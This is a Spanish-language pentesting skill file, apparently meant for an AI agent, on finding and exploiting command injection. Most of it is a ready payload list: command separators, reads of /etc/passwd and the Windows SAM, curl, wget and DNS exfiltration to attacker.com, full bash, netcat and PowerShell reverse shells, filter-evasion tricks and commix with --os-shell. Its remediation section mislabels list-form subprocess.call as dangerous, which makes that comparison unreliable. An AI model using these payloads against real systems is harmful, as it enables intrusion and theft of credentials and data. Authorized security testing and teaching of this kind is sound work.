---
name: command-injection-testing
description: Habilidades profesionales y metodología para pruebas de vulnerabilidad de inyección de comandos
version: 1.0.0
---

# Pruebas de vulnerabilidad de inyección de comandos

## Descripción general

La inyección de comandos es una vulnerabilidad que permite la ejecución de comandos del sistema a través de una aplicación. Cuando una aplicación pasa la entrada del usuario directamente a un comando del sistema, un atacante puede ejecutar comandos arbitrarios. Esta habilidad proporciona métodos para la detección, explotación y protección contra la inyección de comandos.

## Principio de la vulnerabilidad

Cuando una aplicación llama a comandos del sistema, no valida ni filtra adecuadamente la entrada del usuario, lo que permite a los atacantes inyectar comandos adicionales.

**Ejemplo de código peligroso:**
```php
// PHP
system("ping " . $_GET['ip']);

// Python
os.system("ping " + user_input)

// Node.js
child_process.exec("ping " + user_input)
```

## Métodos de prueba

### 1. Identificar puntos de ejecución de comandos

**Funciones comunes:**
- Función Ping
- Consultas DNS
- Operaciones de archivos
- Información del sistema
- Visualización de registros
- Copia de seguridad y restauración

### 2. Detección básica

**Separadores de comandos de prueba:**
```
;  # Separador de comandos (Linux/Windows)
&  # Ejecución en segundo plano (Linux/Windows)
|  # Tubería (Linux/Windows)
&& # AND lógico (Linux/Windows)
|| # OR lógico (Linux/Windows)
`  # Sustitución de comandos (Linux)
$() # Sustitución de comandos (Linux)
```

**Payloads de prueba:**
```
127.0.0.1; id
127.0.0.1 && whoami
127.0.0.1 | cat /etc/passwd
127.0.0.1 `whoami`
127.0.0.1 $(whoami)
```

### 3. Inyección de comandos ciega

**Detección por retraso de tiempo:**
```
127.0.0.1; sleep 5
127.0.0.1 && sleep 5
127.0.0.1 | sleep 5
```

**Extracción de datos (Out-of-band):**
```
127.0.0.1; curl http://attacker.com/?$(whoami)
127.0.0.1 && wget http://attacker.com/$(cat /etc/passwd)
```

**Extracción por DNS:**
```
127.0.0.1; nslookup $(whoami).attacker.com
```

## Técnicas de explotación

### Ejecución de comandos básica

**Linux:**
```
; id
; whoami
; uname -a
; cat /etc/passwd
; ls -la
```

**Windows:**
```
& whoami
& ipconfig
& type C:\Windows\System32\drivers\etc\hosts
& dir
```

### Operaciones de archivos

**Leer archivos:**
```
; cat /etc/passwd
; type C:\Windows\System32\config\sam
; head -n 20 /var/log/apache2/access.log
```

**Escribir archivos:**
```
; echo "<?php phpinfo(); ?>" > /tmp/shell.php
; echo "test" > C:\temp\test.txt
```

### Reverse Shell

**Bash:**
```
; bash -i >& /dev/tcp/attacker.com/4444 0>&1
```

**Netcat:**
```
; nc -e /bin/bash attacker.com 4444
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f
```

**PowerShell:**
```
& powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('attacker.com',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## Técnicas de evasión

### Evasión de espacios

```
${IFS}id
${IFS}whoami
$IFS$9id
<>
%09 (Tab)
%20 (Space)
```

### Evasión de separadores de comandos

**Evasión por codificación:**
```
%3b (;)
%26 (&)
%7c (|)
```

**Evasión por salto de línea:**
```
%0a (Salto de línea)
%0d (Retorno de carro)
```

### Evasión de filtrado de palabras clave

**Concatenación de variables:**
```bash
a=w;b=ho;c=ami;$a$b$c
```

**Comodines:**
```bash
/bin/c?t /etc/passwd
/usr/bin/ca* /etc/passwd
```

**Evasión con comillas:**
```bash
w'h'o'a'm'i
w"h"o"a"m"i
```

**Barra invertida:**
```bash
w\ho\am\i
```

**Codificación Base64:**
```bash
echo "d2hvYW1p" | base64 -d | bash
```

### Evasión de límite de longitud

**Uso de archivos:**
```bash
echo "id" > /tmp/c
sh /tmp/c
```

**Uso de variables de entorno:**
```bash
export x='id';$x
```

## Uso de herramientas

### Commix

```bash
# Escaneo básico
python commix.py -u "http://target.com/ping?ip=127.0.0.1"

# Especificar punto de inyección
python commix.py -u "http://target.com/ping?ip=INJECT_HERE" --data="ip=INJECT_HERE"

# Obtener Shell
python commix.py -u "http://target.com/ping?ip=127.0.0.1" --os-shell
```

### Burp Suite

1. Interceptar la solicitud
2. Enviar a Intruder
3. Usar una lista de payloads de inyección de comandos
4. Observar la respuesta o el retraso de tiempo

## Verificación y reporte

### Pasos de verificación

1. Confirmar que se pueden ejecutar comandos del sistema
2. Verificar los resultados de la ejecución de comandos
3. Evaluar el impacto (control del sistema, fuga de datos, etc.)
4. Registrar la prueba de concepto (POC) completa

### Puntos clave del reporte

- Ubicación de la vulnerabilidad y parámetros de entrada
- Tipos de comandos ejecutables
- Pasos completos de explotación y POC
- Recomendaciones de remediación (validación de entrada, parametrización, listas blancas, etc.)

## Medidas de protección

### Soluciones recomendadas

1. **Evitar la ejecución de comandos**
   - Usar API en lugar de comandos del sistema
   - Usar funciones de biblioteca en lugar de comandos

2. **Validación de entrada**
   ```python
   import re
   
   def validate_ip(ip):
       pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
       if not re.match(pattern, ip):
           raise ValueError("Invalid IP")
       parts = ip.split('.')
       if not all(0 <= int(p) <= 255 for p in parts):
           raise ValueError("Invalid IP range")
       return ip
   ```

3. **Comandos parametrizados**
   ```python
   import subprocess
   
   # Peligroso
   subprocess.call(['ping', '-c', '1', user_input])
   
   # Seguro - Usar lista de parámetros
   subprocess.call(['ping', '-c', '1', validated_ip])
   ```

4. **Validación por lista blanca**
   ```python
   ALLOWED_COMMANDS = ['ping', 'nslookup']
   ALLOWED_OPTIONS = {'ping': ['-c', '-n']}
   
   if command not in ALLOWED_COMMANDS:
       raise ValueError("Command not allowed")
   ```

5. **Mínimo privilegio**
   - Ejecutar la aplicación con un usuario de bajos privilegios
   - Restringir el acceso al sistema de archivos
   - Usar chroot o aislamiento de contenedores

6. **Filtrado de salida**
   - Restringir el contenido de salida
   - Filtrar información sensible
   - Registrar los registros de ejecución de comandos

## Consideraciones

- Realizar solo en entornos de pruebas de seguridad autorizados
- Evitar causar daños al sistema
- Prestar atención a las diferencias de comandos entre diferentes sistemas operativos
- Durante las pruebas, prestar atención al alcance del impacto de la ejecución de comandos